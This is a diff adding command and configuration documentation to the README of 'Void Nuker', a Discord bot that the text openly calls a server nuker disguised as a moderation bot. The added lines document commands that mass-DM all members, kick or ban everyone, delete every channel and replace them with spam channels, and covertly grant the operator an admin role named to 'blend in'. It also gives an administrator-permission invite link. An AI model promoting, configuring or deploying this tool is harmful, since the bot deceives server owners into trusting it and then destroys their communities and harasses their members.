@@ -46,9 +46,54 @@ Void Nuker is a discord server nuker that is disguised as a normal moderation bo
 
 
 
+##Commands
 
+There are 2 types of commands - Normal and Fun. The normal commands are just "kick" "ban" "clear" and whatever else. The *fun* commands are "kickallmemberslmao" "dmeveryoneinserver", etc.
 
+Normal Commands
+```
+#Kicks @Izzo8#8083
+!kick @Izzo8#8083
 
+#Bans @Blossom#3888
+!ban @Blossom#3888
+
+#Sends 'Pong!'
+!ping
+
+#Returns @Izz#9490's name, user id, highest role, status, etc.
+!info @Izz#9490
+
+#Sends BOT_INVITE's value from main.py
+!invite
+
+#Deletes the past 10 messages
+!clear 10
+```
+
+Fun Commands
+```
+#DMs everyone in the server DM_MESSAGE from main.py
+!dmeveryoneinserver
+
+#Kicks everyone in server
+!kickallmemberslmao
+
+#Deletes all channels and replaces them with #FUCKED-BY-*your name here*. Also bans everyone.
+!takecareofchannelsandban
+
+#Makes a role with admin permissions, then gives you that role.
+!giveadmintoyourself
+```
+
+##Variables
+TOKEN = Your bot token. This is what connects Void Nuker to your Discord Bot.
+PREFIX = What makes the bot know its a command, for example a command would be "!ping" if the prefix is !. 
+DM_MESSAGE = If you run !dmeveryoneinserver, this is what it sends.
+SPAM_MESSAGE = When channels are made, then it sends this message over and over, with @everyone attached to it.
+CHANNEL_NAME = When !takecareofchannelsandban is run, it deletes all the channels and replaces it with multiple channels named this. Its typically "FUCKED-BY-*your name here* or "NUKED-BY-*your name here*
+ROLE_NAME = When !giveadmintoyourself is run, it makes a role with admin perms. This is what the role is called. Make it something that will blend in, like "Member" or "@everyone".
+BOT_INVITE = https://discord.com/api/oauth2/authorize?client_id=*your bot id here*&permissions=8&scope=bot
 
 ## Contributing
 
